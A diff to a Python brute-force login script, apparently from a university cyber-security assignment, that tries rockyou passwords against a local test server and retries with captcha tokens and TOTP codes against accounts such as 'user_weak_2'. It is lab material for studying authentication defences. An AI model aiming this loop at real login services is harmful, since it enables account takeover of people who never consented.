@@ -47,13 +47,15 @@ class Attacker:
 
     def run_brute_force(self, target_username, target_totp_secret=None):
         for password in self.password_list:
+            captcha_token = None
+            print(password)
             while True:
-                resp = self.login_attempt(target_username, password)
+                resp = self.login_attempt(target_username, password, captcha_token=captcha_token)
                 data = resp.json()
                 status = data.get("status")
 
                 match status:
-                    case "sucess":
+                    case "success":
                         return True
                     case "totp_required":
                         totp_resp = self.login_totp(target_username, target_totp_secret)
@@ -65,10 +67,6 @@ class Attacker:
                         time.sleep(1) #todo change
                     case "captcha_required":
                         captcha_token = self.get_captcha_token()
-                        self.login_attempt(target_username, password, captcha_token=captcha_token)
-                        if resp.json().get("status") == "success": # toto validate status
-                            return True
-                        break
                     case "account_locked":
                         return False
                     case "failure":
@@ -79,12 +77,12 @@ class Attacker:
     
     
 if __name__ == "__main__":
-    BASE_URL = "http://localhost"
-    DICTIONARY_FILE_PATH = "../assets/rockyou_top_50k.txt"
-    USERS_FILE_PATH = "../assets/users.json"
+    BASE_URL = "http://localhost:5000"
+    DICTIONARY_FILE_PATH = "C:\\Users\\idoloven\\university\\courses\\2026\\intro-to-cyber-security\\auth-defense-mechanisms\\assets\\rockyou_top_50k.txt"
+    USERS_FILE_PATH = "C:\\Users\\idoloven\\university\\courses\\2026\\intro-to-cyber-security\\auth-defense-mechanisms\\assets\\users.json"
     GROUP_SEED = "214265977"
     
     attacker = Attacker(BASE_URL, DICTIONARY_FILE_PATH, USERS_FILE_PATH, GROUP_SEED)
-    result = attacker.run_brute_force("user_weak_1")
+    result = attacker.run_brute_force("user_weak_2")
     print(result)
     
